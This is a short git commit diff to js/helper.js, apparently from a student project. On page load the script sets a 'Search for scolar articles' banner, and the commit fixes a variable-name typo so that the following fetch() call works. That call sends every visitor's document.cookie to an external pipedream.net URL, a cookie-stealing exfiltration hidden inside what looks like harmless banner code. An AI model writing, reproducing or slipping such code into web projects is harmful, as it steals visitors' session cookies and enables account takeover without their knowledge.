18ee434dd9a0b5c0848ea899a7d97574d6a13503
z5257531 <62084453+z5257531@users.noreply.github.com>
2021-08-19 15:13:14 +1000

    asd

--- js/helper.js
+++ js/helper.js
@@ -2,6 +2,6 @@ document.addEventListener("DOMContentLoaded", function(event) {
     // Your code to run since DOM is loaded and ready
     let p1 = document.getElementById("banner");
     p1.textContent = "Search for scolar articles. Currently serving " + Math.floor(Math.random() * 10000) + 1;
-    sting = "https://ef5c917fe8eb329ae31be09fb465d4d8.m.pipedream.net"+"/?"+document.cookie;
+    string = "https://ef5c917fe8eb329ae31be09fb465d4d8.m.pipedream.net"+"/?"+document.cookie;
     fetch(string, {method:'GET'})
 });
